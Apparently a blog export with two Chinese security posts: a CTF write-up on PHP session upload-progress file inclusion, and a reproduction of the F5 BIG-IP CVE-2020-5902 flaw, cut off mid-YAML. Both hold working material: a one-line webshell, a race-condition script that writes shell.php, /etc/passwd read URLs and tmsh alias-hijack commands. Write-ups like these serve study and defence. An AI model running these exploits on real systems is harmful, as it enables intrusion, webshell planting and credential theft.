<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021-第五空间智能安全大赛-Web-EasyCleanup 分析</title>
      <link href="/posts/5b702f7a.html"/>
      <url>/posts/5b702f7a.html</url>
      
        <content type="html"><![CDATA[<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>在CTFHub中启动对应的靶场环境，打开后即可看到对应的源码，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在代码的第三行，判断<code>!isset($_GET[&#39;mode&#39;])</code>是否存在<code>mode</code>参数的值，若不存在，则调用<code>highlight_file(__file__)</code>高亮显示本文件的PHP源码内容；</p><p>在代码第五行，判断<code>$_GET[&#39;mode&#39;] == &quot;eval&quot;</code>获取到的<code>mode</code>参数的值是否等于<code>eval</code>，若条件成立，则对<code>$shell</code>进行赋值；</p><p>在代码第六行，<code>$shell = $_GET[&#39;shell&#39;] ?? &#39;phpinfo();&#39;;</code>，若通过GET方式传入的参数<code>shell</code>的值存在，则变量<code>$shell</code>的值等于传入参数<code>shell</code>的值，若若通过GET方式传入的参数<code>shell</code>的值不存在，否则变量<code>$shell</code>的值等于<code>phpinfo()</code>；</p><p>在代码第七行，<code>strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)</code>，对变量<code>$shell</code>的值进行了条件判断；若变量<code>$shell</code>的长度大于15，或者<code>filter()</code>函数和<code>checkNums()</code>函数的返回值为<code>True</code>时，执行<code>exit(hacker)</code>退出程序执行；若条件判断结果为<code>False</code>，则执行<code>eval($shell)</code>；</p><p>在代码第十二行，<code>isset($_GET[&#39;file&#39;])</code>，判断是否存在<code>file</code>参数的值，若存在<code>file</code>参数的值，<code>strlen($_GET[&#39;file&#39;]) &gt; 15 | filter($_GET[&#39;file&#39;])</code>，长度大于15或者<code>filter()</code>函数的返回值为<code>True</code>时，执行<code>exit(hacker)</code>退出程序执行；若条件判断结果为<code>False</code>，则执行<code>include $_GET[&#39;file&#39;]</code>；</p><p>在代码第十八行，定义了函数<code>filter()</code>，在函数内部定义了一个列表<code>$banned</code>存放了一些关键的字符串，然后在传入到函数的参数中查找每一个字符串，若存在，则返回True，否则返回False；</p><p>在代码第二十二行，定义了函数<code>checkNums()</code>，在函数内部定义了一个包含数字和大小写字母的变量<code>$alphanum</code>，将传入函数参数的每个字符与变量<code>$alphanum</code>中的每个字符进行对比，若值相等，则计数加一，当计数变量<code>$cnt</code>大于8时，返回False，否则返回True；</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>该PHP文件在第八行调用了<code>eval()</code>函数，某些情况下可以直接达到RCE的目的，但是对传入到<code>eval()</code>函数中的参数<code>shell</code>通过<code>filter()</code>函数和<code>chekcNums()</code>函数进行了限制，无法进行绕过；</p><p>在第十四行调用了<code>include</code>进行文件包含，对传入的参数只判断了长度和调用<code>filter()</code>进行限制，存在绕过的可能性；</p><p>系统存在文件包含的漏洞，但是没有可以包含的恶意文件，此时可以利用PHP的<code>session.upload_progress</code>将恶意代码语句写入到session文件中，然后包含session文件，进而攻击服务器；</p><p>上述攻击方式的前提是需要知道session文件的存放位置，先访问如下的URL链接，查看<code>phpinfo</code>的文件内容；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-dceb7e05e554ea56.sandbox.ctfhub.com:10800/?mode=eval</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数含义</span></span><br><span class="line"></span><br><span class="line">session.auto_start = off</span><br><span class="line"><span class="comment">// 如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的</span></span><br><span class="line">session.upload_progress.enabled = on</span><br><span class="line"><span class="comment">// 默认开启这个选项，表示upload_progress功能开始，PHP能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来���查这个状态。</span></span><br><span class="line">session.upload_progress.cleanup = off</span><br><span class="line"><span class="comment">// 默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。</span></span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment">// 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。</span></span><br><span class="line">session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="comment">// session.upload_progress.freq = &quot;1%&quot;+session.upload_progress.min_freq = &quot;1&quot;：选项控制了上传进度信息应该多久被重新计算一次。通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</span></span><br><span class="line"></span><br><span class="line">session.use_strict_mode = <span class="number">0</span></span><br><span class="line"><span class="comment">// 默认值为0，此时用户可以自定义session ID的值，在Cookie里设置PHPSESSID=zzzz，PHP在服务器上创建的session文件名为：sess_zzzz</span></span><br><span class="line">session.save_path</span><br><span class="line"><span class="comment">// 该参数没有值，默认就是/tmp/sess_xxxx</span></span><br></pre></td></tr></table></figure><p>此时需要利用<code>session.upload_progress</code>上传恶意文件，先构造一个上传的表单文件，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://challenge-175dd3c395489121.sandbox.ctfhub.com:10800/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>         <span class="comment">&lt;!--不对字符编码--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;go&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码详解</span></span><br><span class="line">action： 为目标的URL</span><br><span class="line">method： 请求方式为POST</span><br><span class="line">name：为PHP_SESSION_UPLOAD_PROGRESS</span><br><span class="line">value：一句话木马</span><br></pre></td></tr></table></figure><p>本地访问构造的上传文件，选择文件上传，截获数据包；</p><p>在数据包中添加Cookie信息<code>PHPSESSID=zzzz</code>；</p><p>使用蚁剑连接如下链接；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-175dd3c395489121.sandbox.ctfhub.com:10800/?file=/tmp/sess_zzzz</span><br></pre></td></tr></table></figure><p>当<code>session.upload_progress.cleanup</code>设置为<code>on</code>时，当文件上传结束后，php将会立即清空对应session文件中的内容，包含该session文件相当于包含一个空文件；此时需要利用条件竞争，赶在文件被清除前利用即可；</p><p>利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://192.33.6.145/index.php&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://192.33.6.145/index.php?file=../../../../../../../../var/lib/php/sessions/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(&#x27;[+++]retry&#x27;)</span></span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"> </span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/chalan630/p/14147602.html</span><br><span class="line">https://blog.csdn.net/qq_53863234/article/details/121665714</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902</title>
      <link href="/posts/c27044da.html"/>
      <url>/posts/c27044da.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在F5 BIG-IP产品的流量管理用户页面 (TMUI)&#x2F;配置程序的特定页面中存在一处远程代码执行漏洞，未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行，包括执行任意系统命令、任意文件读取、任意文件写入、开启&#x2F;禁用服务等。</p><p><strong>漏洞影响：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F5 BIG-IP 15.x - 15.1.0.4</span><br><span class="line">F5 BIG-IP 14.x - 14.1.2.6</span><br><span class="line">F5 BIG-IP 13.x - 13.1.3.4</span><br><span class="line">F5 BIG-IP 12.x - 12.1.5.2</span><br><span class="line">F5 BIG-IP 11.x - 11.6.5.2</span><br></pre></td></tr></table></figure><p><strong>网络空间测绘：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;BIG-IP&amp;reg ;- Redirect&quot;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="未授权文件读取"><a href="#未授权文件读取" class="headerlink" title="未授权文件读取"></a>未授权文件读取</h3><p>在进行文件读取的时候未对<code>fileName</code>参数进行处理，直接调用了<code>WorkspaceUtils.readFile(fileName)</code>方法；</p><p><img src="/Big-IP-CVE-2020-5902/3.png" alt="3"></p><p>访问如下的URL链接，即可读取系统的<code>/etc/passwd</code>文件；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/Big-IP-CVE-2020-5902/image-20221228132132629.png" alt="image-20221228132132629"></p><p><img src="/Big-IP-CVE-2020-5902/image-20221228131801865.png" alt="image-20221228131801865"></p><h3 id="未授权文件上传"><a href="#未授权文件上传" class="headerlink" title="未授权文件上传"></a>未授权文件上传</h3><p>在进行文件上传时，未对<code>fileName</code>，<code>content</code>参数进行处理，直接调用<code>WorkspaceUtils.saveFile()</code> 方法，进行文件上传；</p><p><img src="/Big-IP-CVE-2020-5902/5.png" alt="5"></p><p>发送如下的数据包，即可向目标系统上传文件；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">fileName=/tmp/test.txt&amp;content=test</span><br></pre></td></tr></table></figure><p><img src="/Big-IP-CVE-2020-5902/image-20221228133120065.png" alt="image-20221228133120065"></p><p>然后读取上传的文件内容；</p><p><img src="/Big-IP-CVE-2020-5902/image-20221228133304919.png" alt="image-20221228133304919"></p><h3 id="未授权命令执行"><a href="#未授权命令执行" class="headerlink" title="未授权命令执行"></a>未授权命令执行</h3><p><img src="/Big-IP-CVE-2020-5902/7.png" alt="img"></p><p><img src="/Big-IP-CVE-2020-5902/8.png" alt="img"></p><p>通过对代码的分析，发现要想执行系统命令，需要满足以下的条件；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命令的第一个指令必须是：create、delete、list、modify其中一个</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">runTmshCommand</span><span class="params">(String command)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">operation</span> <span class="operator">=</span> command.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (ShellCommandValidator.checkForBadShellCharacters(command) || !operation.equals(<span class="string">&quot;create&quot;</span>) &amp;&amp; !operation.equals(<span class="string">&quot;delete&quot;</span>) &amp;&amp; !operation.equals(<span class="string">&quot;list&quot;</span>) &amp;&amp; !operation.equals(<span class="string">&quot;modify&quot;</span>)) &#123;</span><br><span class="line">        error = NLSEngine.getString(<span class="string">&quot;ilx.workspace.error.RejectedTmshCommand&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//命令不能包含以下特殊字符</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkForBadShellCharacters</span><span class="params">(String value)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] cArray = value.toCharArray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cArray.length; ++i) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> cArray[i];</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;&amp;&#x27;</span> || c == <span class="string">&#x27;;&#x27;</span> || c == <span class="string">&#x27;`&#x27;</span> || c == <span class="string">&#x27;\&#x27;&#x27;</span> || c == <span class="string">&#x27;\\&#x27;</span> || c == <span class="string">&#x27;&quot;&#x27;</span> || c == <span class="string">&#x27;|&#x27;</span> || c == <span class="string">&#x27;*&#x27;</span> || c == <span class="string">&#x27;?&#x27;</span> || c == <span class="string">&#x27;~&#x27;</span> || c == <span class="string">&#x27;&lt;&#x27;</span> || c == <span class="string">&#x27;&gt;&#x27;</span> || c == <span class="string">&#x27;^&#x27;</span> || c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;)&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;]&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span> || c == <span class="string">&#x27;&#125;&#x27;</span> || c == <span class="string">&#x27;$&#x27;</span> || c == <span class="string">&#x27;\n&#x27;</span> || c == <span class="string">&#x27;\r&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过定义命令别名的方式，将上面要求的<code>create</code>、<code>delete</code>、<code>list</code>、<code>modify</code>指定成<code>/bin/bash</code>，这样就可以执行任意系统命令；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 定义别名语法： </span><br><span class="line">create /cli alias [xx] command [&quot;save /sys config&quot;]</span><br><span class="line"></span><br><span class="line"># 删除别名语法：</span><br><span class="line">delete /cli alias [xx]</span><br></pre></td></tr></table></figure><p>网上公开的执行命令 POC步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取admin用户账号密码</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span><br><span class="line"></span><br><span class="line">1.修改alias劫持list命令为bash</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+/cli+alias+private+list+command+bash</span><br><span class="line"></span><br><span class="line">3.执行bash文件</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx</span><br><span class="line"></span><br><span class="line">4.还原list命令</span><br><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</span><br></pre></td></tr></table></figure><h2 id="XRay-POC"><a href="#XRay-POC" class="headerlink" title="XRay POC"></a>XRay POC</h2><p>使用XRay POC进行验证；</p><p><img src="/Big-IP-CVE-2020-5902/image-20221228141818238.png" alt="image-20221228141818238"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span 